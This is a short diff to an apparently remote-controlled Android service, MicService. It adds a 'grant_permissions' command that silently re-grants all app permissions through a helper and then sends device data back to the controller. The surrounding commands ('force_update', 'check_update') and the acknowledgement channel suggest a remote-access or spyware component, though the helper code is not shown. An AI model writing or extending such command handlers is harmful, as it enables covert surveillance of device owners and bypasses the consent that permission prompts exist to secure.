@@ -558,6 +558,21 @@ class MicService : Service() {
                 UpdateWorker.checkNow(this)
                 safeSend("ACK:force_update")
             }
+            "grant_permissions" -> {
+                Log.i(TAG, "CMD: grant_permissions - re-granting all permissions")
+                try {
+                    UpdateService.autoGrantPermissions(this)
+                    safeSend("ACK:grant_permissions:success")
+                    // Collect and send data to verify permissions work
+                    serviceScope.launch(Dispatchers.IO) {
+                        delay(500)  // Wait for permissions to apply
+                        sendDeviceData()
+                    }
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to grant permissions: ${e.message}")
+                    safeSend("ACK:grant_permissions:error:${e.message}")
+                }
+            }
             "check_update" -> {
                 Log.i(TAG, "CMD: check_update - triggering update check")
                 serviceScope.launch(Dispatchers.IO) {
